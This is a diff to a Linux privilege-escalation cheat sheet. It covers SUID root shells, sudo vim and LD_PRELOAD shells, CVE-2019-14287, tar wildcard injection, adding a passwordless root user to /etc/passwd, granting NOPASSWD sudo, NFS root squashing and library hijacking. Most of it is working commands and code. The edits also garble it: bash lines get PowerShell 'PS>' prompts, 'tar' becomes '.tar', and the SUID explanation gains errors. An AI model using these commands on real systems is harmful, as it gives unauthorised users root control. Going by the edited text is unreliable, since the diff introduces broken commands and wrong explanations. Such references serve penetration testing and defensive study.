@@ -51,7 +51,7 @@
 
 ## Tools
 
-There are many scripts that you can execute on a linux machine which automatically enumerate sytem information, processes, and files to locate privilege escelation vectors.
+There are many scripts that you can execute on a linux machine which automatically enumerates sytem information, processes, and files to locate privilege escalation vectors.
 Here are a few:
 
 - [LinPEAS - Linux Privilege Escalation Awesome Script](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
@@ -253,14 +253,14 @@ dsa/1024/68b329da9893e34099c7d8ad5cb9c940-17934.pub
 ssh -vvv victim@target -i 68b329da9893e34099c7d8ad5cb9c940-17934
 ```
 
-And you should connect without requiring a password. If stuck, the `-vvv` verbosity should provide enough details as to why.
+# And you should connect without requiring a password. If stuck, the `-vvv` verbosity should provide enough details as to why.
 
 ## Scheduled tasks
 
 ### Cron jobs
 
-Check if you have access with write permission on these files.   
-Check inside the file, to find other paths with write permissions.   
+*Check if you have access with write permission on these files.   
+*Check inside the file, to find other paths with write permissions.   
 
 ```powershell
 /etc/init.d
@@ -312,7 +312,7 @@ Mon 2019-04-01 07:36:10 CEST  20h left Sat 2019-03-09 14:28:25 CET   3 weeks 0 d
 
 ## SUID
 
-SUID/Setuid stands for "set user ID upon execution", it is enabled by default in every Linux distributions. If a file with this bit is ran, the uid will be changed by the owner one. If the file owner is `root`, the uid will be changed to `root` even if it was executed from user `bob`. SUID bit is represented by an `s`.
+*SUID/Setuid stands for "set user ID upon execution", it is enabled by default in every Linux distro. If a file with this bit is ran, the suid will be changed by the owner one. If the file owner is `root`, the suid will be changed to `root` even if it was executed from: user `bob`. SUID bit is represented by an `s`.
 
 ```powershell
 ╭─swissky@lab ~  
@@ -337,10 +337,10 @@ find / -uid 0 -perm -4000 -type f 2>/dev/null
 
 
 ```bash
-print 'int main(void){\nsetresuid(0, 0, 0);\nsystem("/bin/sh");\n}' > /tmp/suid.c   
-gcc -o /tmp/suid /tmp/suid.c  
-sudo chmod +x /tmp/suid # execute right
-sudo chmod +s /tmp/suid # setuid bit
+$print 'int main(void){\nsetresuid(0, 0, 0);\nsystem("/bin/sh");\n}' > /tmp/suid.c   
+$gcc -o /tmp/suid /tmp/suid.c  
+$sudo chmod +x /tmp/suid # execute right
+$sudo chmod +s /tmp/suid # setuid bit
 ```
 
 
@@ -363,26 +363,25 @@ sudo chmod +s /tmp/suid # setuid bit
 ### Edit capabilities
 
 ```powershell
-/usr/bin/setcap -r /bin/ping            # remove
-/usr/bin/setcap cap_net_raw+p /bin/ping # add
+PS> /usr/bin/setcap -r /bin/ping            # remove
+PS> /usr/bin/setcap cap_net_raw+p /bin/ping # add
 ```
 
 ### Interesting capabilities
+*Having the capability =ep means the binary has all the capabilities.
 
-Having the capability =ep means the binary has all the capabilities.
 ```powershell
 $ getcap openssl /usr/bin/openssl 
-openssl=ep
+PS> openssl=ep
 ```
 
-Alternatively the following capabilities can be used in order to upgrade your current privileges.
+*Alternatively, the following capabilities can be used in order to upgrade your current privileges.
 
 ```powershell
 cap_dac_read_search # read anything
 cap_setuid+ep # setuid
 ```
-
-Example of privilege escalation with `cap_setuid+ep`
+*Example of privilege escalation with `cap_setuid+ep`
 
 ```powershell
 $ sudo /usr/bin/setcap cap_setuid+ep /usr/bin/python2.7
@@ -412,35 +411,35 @@ uid=0(root) gid=1000(swissky)
 
 ## SUDO
 
-Tool: [Sudo Exploitation](https://github.com/TH3xACE/SUDO_KILLER)
+*Tool: [Sudo Exploitation](https://github.com/TH3xACE/SUDO_KILLER)
 
 ### NOPASSWD
 
-Sudo configuration might allow a user to execute some command with another user privileges without knowing the password.
+*Sudo configuration might allow a user to execute some command with another user privileges without knowing the password.
 
 ```bash
 $ sudo -l
 
-User demo may run the following commands on crashlab:
+# User demo may run the following commands on crashlab:
     (root) NOPASSWD: /usr/bin/vim
 ```
 
-In this example the user `demo` can run `vim` as `root`, it is now trivial to get a shell by adding an ssh key into the root directory or by calling `sh`.
+*In this example, the user `demo` can run `vim` as `root`, it is now trivial to get a shell by adding an ssh key into the root directory or by calling `sh`.
 
 ```bash
-sudo vim -c '!sh'
-sudo -u root vim -c '!sh'
+$ sudo vim -c '!sh'
+$ sudo -u root vim -c '!sh'
 ```
 
 ### LD_PRELOAD and NOPASSWD
 
-If `LD_PRELOAD` is explicitly defined in the sudoers file
+*If `LD_PRELOAD` is explicitly defined in the sudoers file
 
 ```powershell
 Defaults        env_keep += LD_PRELOAD
 ```
 
-Compile the following shared object using the C code below with `gcc -fPIC -shared -o shell.so shell.c -nostartfiles`
+*Compile the following shared object using the C code below with `gcc -fPIC -shared -o shell.so shell.c -nostartfiles`
 
 ```c
 #include <stdio.h>
@@ -455,19 +454,19 @@ void _init() {
 }
 ```
 
-Execute any binary with the LD_PRELOAD to spawn a shell : `sudo LD_PRELOAD=<full_path_to_so_file> <program>`, e.g: `sudo LD_PRELOAD=/tmp/shell.so find`
+*Execute any binary with the LD_PRELOAD to spawn a shell : `sudo LD_PRELOAD=<full_path_to_so_file> <program>`, e.g: `sudo LD_PRELOAD=/tmp/shell.so find`
 
 ### Doas
 
-There are some alternatives to the `sudo` binary such as `doas` for OpenBSD, remember to check its configuration at `/etc/doas.conf`
+*There are some alternatives to the `sudo` binary such as `doas` for OpenBSD, remember to check its configuration at `/etc/doas.conf`
 
 ```bash
-permit nopass demo as root cmd vim
+$ permit nopass demo as root cmd vim
 ```
 
 ### sudo_inject
 
-Using [https://github.com/nongiach/sudo_inject](https://github.com/nongiach/sudo_inject)
+*Using [https://github.com/nongiach/sudo_inject](https://github.com/nongiach/sudo_inject)
 
 ```powershell
 $ sudo whatever
@@ -481,7 +480,7 @@ $ sudo -i # no password required :)
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
-Slides of the presentation : [https://github.com/nongiach/sudo_inject/blob/master/slides_breizh_2019.pdf](https://github.com/nongiach/sudo_inject/blob/master/slides_breizh_2019.pdf)
+*Slides of the presentation : [https://github.com/nongiach/sudo_inject/blob/master/slides_breizh_2019.pdf](https://github.com/nongiach/sudo_inject/blob/master/slides_breizh_2019.pdf)
 
 
 ### CVE-2019-14287
@@ -491,15 +490,15 @@ Slides of the presentation : [https://github.com/nongiach/sudo_inject/blob/maste
 (ALL, !root) ALL
 
 # If you have a full TTY, you can exploit it like this
-sudo -u#-1 /bin/bash
-sudo -u#4294967295 id
+$ sudo -u#-1 /bin/bash
+$ sudo -u#4294967295 id
 ```
 
 ## GTFOBins
 
 [GTFOBins](https://gtfobins.github.io) is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions.
 
-The project collects legitimate functions of Unix binaries that can be abused to break out restricted shells, escalate or maintain elevated privileges, transfer files, spawn bind and reverse shells, and facilitate the other post-exploitation tasks.
+*The project collects legitimate functions of Unix binaries that can be abused to break out restricted shells, escalate or maintain elevated privileges, transfer files, spawn bind and reverse shells, and facilitate the other post-exploitation tasks.
 
 > gdb -nx -ex '!sh' -ex quit    
 > sudo mysql -e '\! /bin/sh'    
@@ -509,88 +508,74 @@ The project collects legitimate functions of Unix binaries that can be abused to
 
 ## Wildcard
 
-By using tar with –checkpoint-action options, a specified action can be used after a checkpoint. This action could be a malicious shell script that could be used for executing arbitrary commands under the user who starts tar. “Tricking” root to use the specific options is quite easy, and that's where the wildcard comes in handy.
+*By using .tar with –checkpoint-action options, a specified action can be used after a checkpoint. This action could be a malicious shell script that could be used for executing arbitrary commands under the user who starts .tar or “Tricking” root to use the specific options. IT is quite easy, and that's where the wildcard comes in handy.
 
 ```powershell
 # create file for exploitation
-touch -- "--checkpoint=1"
-touch -- "--checkpoint-action=exec=sh shell.sh"
-echo "#\!/bin/bash\ncat /etc/passwd > /tmp/flag\nchmod 777 /tmp/flag" > shell.sh
+PS> touch -- "--checkpoint=1"
+PS> touch -- "--checkpoint-action=exec=sh shell.sh"
+$ echo "#\!/bin/bash\ncat /etc/passwd > /tmp/flag\nchmod 777 /tmp/flag" > shell.sh
 
 # vulnerable script
-tar cf archive.tar *
+$ .tar -cf archive.tar *
 ```
 
-Tool: [wildpwn](https://github.com/localh0t/wildpwn)
+*Tool: [wildpwn](https://github.com/localh0t/wildpwn)
 
 ## Writable files
 
-List world writable files on the system.
+*List world writable files on the system.
 
 ```powershell
-find / -writable ! -user `whoami` -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; 2>/dev/null
-find / -perm -2 -type f 2>/dev/null
-find / ! -path "*/proc/*" -perm -2 -type f -print 2>/dev/null
+PS> find / -writable ! -user `whoami` -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; 2>/dev/null
+PS> find / -perm -2 -type f 2>/dev/null
+PS> find / ! -path "*/proc/*" -perm -2 -type f -print 2>/dev/null
 ```
 
 ### Writable /etc/sysconfig/network-scripts/ (Centos/Redhat)
 
-/etc/sysconfig/network-scripts/ifcfg-1337 for example
+$ /etc/sysconfig/network-scripts/ifcfg-1337 for example
 
 ```powershell
-NAME=Network /bin/id  &lt;= Note the blank space
-ONBOOT=yes
+PS> NAME=Network /bin/id  &lt;= Note the blank space
+PS> ONBOOT=yes
 DEVICE=eth0
 
-EXEC :
-./etc/sysconfig/network-scripts/ifcfg-1337
+*EXEC :
+PS> ./etc/sysconfig/network-scripts/ifcfg-1337
 ```
-src : [https://vulmon.com/exploitdetailsqidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
+src=URL:[https://vulmon.com/exploitdetailsqidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
 
 ### Writable /etc/passwd
-
-First generate a password with one of the following commands.
-
+*First generate a password with one of the following commands:
 ```powershell
-openssl passwd -1 -salt hacker hacker
-mkpasswd -m SHA-512 hacker
-python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
+PS> openssl passwd -1 -salt hacker hacker
+PS> mkpasswd -m SHA-512 hacker
+PS> python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
 ```
-
-Then add the user `hacker` and add the generated password.
-
+*Then add the user `hacker` and add the generated password.
 ```powershell
-hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
+PS> hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
 ```
-
-E.g: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`
-
-You can now use the `su` command with `hacker:hacker`
-
-Alternatively you can use the following lines to add a dummy user without a password.    
-WARNING: you might degrade the current security of the machine.
-
+E.g. 
+$`hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`
+*You can now use the `su` command with `hacker:hacker`
+# Alternatively you can use the following lines to add a dummy user without a password.    
+[!]WARNING: you might degrade the current security of the machine.
 ```powershell
-echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
-su - dummy
+PS> echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
+PS> su - dummy
 ```
-
-NOTE: In BSD platforms `/etc/passwd` is located at `/etc/pwd.db` and `/etc/master.passwd`, also the `/etc/shadow` is renamed to `/etc/spwd.db`. 
-
+*NOTE: In BSD platforms `/etc/passwd` is located at `/etc/pwd.db` and `/etc/master.passwd`, also the `/etc/shadow` is renamed to `/etc/spwd.db`. 
 ### Writable /etc/sudoers
-
 ```powershell
-echo "username ALL=(ALL:ALL) ALL">>/etc/sudoers
-
+PS> echo "username ALL=(ALL:ALL) ALL">>/etc/sudoers
 # use SUDO without password
 echo "username ALL=(ALL) NOPASSWD: ALL" >>/etc/sudoers
 echo "username ALL=NOPASSWD: /bin/bash" >>/etc/sudoers
 ```
-
 ## NFS Root Squashing
-
 When **no_root_squash** appears in `/etc/exports`, the folder is shareable and a remote user can mount it.
-
 ```powershell
 # remote check the name of the folder
 showmount -e 10.10.10.10
@@ -608,12 +593,9 @@ cp /bin/bash .
 # set suid permission
 chmod +s bash 	
 ```
-
 ## Shared Library
-
 ### ldconfig
-
-Identify shared libraries with `ldd`
+*Identify shared libraries with `ldd`
 
 ```powershell
 $ ldd /opt/binary
@@ -622,7 +604,7 @@ $ ldd /opt/binary
     /lib64/ld-linux-x86-64.so.2 => /usr/lib64/ld-linux-x86-64.so.2 (0x00007fa55e6c8000)        
 ```
 
-Create a library in `/tmp` and activate the path.
+# Create a library in `/tmp` and activate the path.
 
 ```powershell
 gcc –Wall –fPIC –shared –o vulnlib.so /tmp/vulnlib.c
@@ -643,7 +625,7 @@ level15@nebula:/home/flag15$ ldd ./flag15
  /lib/ld-linux.so.2 (0x005bb000)
 ```
 
-By copying the lib into `/var/tmp/flag15/` it will be used by the program in this place as specified in the `RPATH` variable.
+# By copying the lib into `/var/tmp/flag15/` it will be used by the program in this place as specified in the `RPATH` variable.
 
 ```powershell
 level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/
@@ -654,7 +636,7 @@ level15@nebula:/home/flag15$ ldd ./flag15
  /lib/ld-linux.so.2 (0x00737000)
 ```
 
-Then create an evil library in `/var/tmp` with `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
+# Then create an evil library in `/var/tmp` with `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
 
 ```powershell
 #include<stdlib.h>
